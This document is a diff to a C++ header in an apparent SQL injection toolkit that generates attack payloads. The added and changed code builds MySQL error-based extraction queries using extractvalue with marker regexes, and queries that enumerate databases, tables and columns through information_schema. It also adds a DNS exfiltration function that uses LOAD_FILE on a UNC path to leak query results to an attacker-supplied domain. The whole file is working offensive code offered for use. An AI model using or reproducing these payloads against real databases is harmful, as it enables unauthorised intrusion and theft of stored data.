@@ -1,10 +1,11 @@
 #pragma once
 
 #include <murk/flow.hpp>
+#include <murk/flows/string.hpp>
 
 #include <variant>
 
-namespace murk::xplt::sql {
+namespace murk::xflt::sql {
 
   enum class type {
     number,
@@ -32,7 +33,7 @@ namespace murk::xplt::sql {
 //    bool first = true;
 //    size_t len = 0;
 //    do {
-//      req = "UNION SELECT"
+//      req = "SELECT"
 //      for (auto i = 0; i < len; ++i) {
 
 //      }
@@ -51,12 +52,50 @@ namespace murk::xplt::sql {
 //    return len;
 //  }
 
+  enum class dbms {
+    MySql,
+  };
+
+  struct dbms_oracle {
+    dbms type;
+    murk::flow_t<std::string, std::string> oracle;
+
+    inline std::string operator()(std::string s) const { return oracle(std::move(s)); }
+
+    inline dbms_oracle(dbms type_, decltype(oracle) oracle_) :
+      type{type_}, oracle{std::move(oracle_)} {}
+  };
+
+  std::string err_query(const dbms_oracle& oracle, std::string sql) {
+    switch (oracle.type) {
+      case(dbms::MySql): {
+        std::string begin = "murkbegin";
+        std::string end = "murkend";
+        auto res = oracle(fmt::format("SELECT extractvalue(0,concat(':!@',concat(({}),'@:!')))", sql));
+        return murk::extract(std::regex{":!@(.*)@:!"}, res);
+      } break;
+      default:
+        throw std::invalid_argument("Unimplemented err_query for dbms");
+    }
+  }
+
+  std::string get_pos_info_v = "SELECT a()";
+
+  std::string force_select_v(std::vector<std::string> params) {
+    std::string ret = "SELECT ";
+    for (auto& i : params) {
+      ret += fmt::format("'{}',", i);
+    }
+    ret.pop_back();
+    return ret;
+  }
+
   std::string grab_all_columns_v(std::string_view table_name) {
-    return fmt::format("UNION SELECT * FROM {}--", table_name);
+    return fmt::format("SELECT * FROM {}--", table_name);
   }
 
   std::string list_fields_v(std::string_view columns, std::string_view table, size_t fields = 1) {
-    std::string ret = "UNION SELECT ";
+    std::string ret = "SELECT ";
     for (size_t i = 0; i < fields; ++i)
       ret += fmt::format("GROUP_CONCAT({}),", columns);
     ret.pop_back();
@@ -65,7 +104,7 @@ namespace murk::xplt::sql {
   }
 
   std::string list_columns_v(std::string_view table, size_t fields = 1) {
-    std::string ret = "UNION SELECT ";
+    std::string ret = "SELECT ";
     for (size_t i = 0; i < fields; ++i)
       ret += "GROUP_CONCAT(column_name),";
     ret.pop_back();
@@ -74,7 +113,7 @@ namespace murk::xplt::sql {
   }
 
   std::string list_tables_v(std::string_view db, size_t fields = 1) {
-    std::string ret = "UNION SELECT ";
+    std::string ret = "SELECT ";
     for (size_t i = 0; i < fields; ++i)
       ret += "GROUP_CONCAT(table_name),";
     ret.pop_back();
@@ -83,11 +122,16 @@ namespace murk::xplt::sql {
   }
 
   std::string list_dbs_v(size_t fields = 1) {
-    std::string ret = "UNION SELECT ";
+    std::string ret = "SELECT ";
     for (size_t i = 0; i < fields; ++i)
       ret += "GROUP_CONCAT(information_schema.tables),";
     ret.pop_back();
     ret += "FROM information_schema.schemata";
     return ret;
+  }
+
+  std::string dns_exfiltrate_v(std::string domain_base, std::string_view query) {
+    return fmt::format(R"(SELECT LOAD_FILE(concat('\\\\',({}), '.{}\\')))",
+                       query, domain_base);
   }
 }
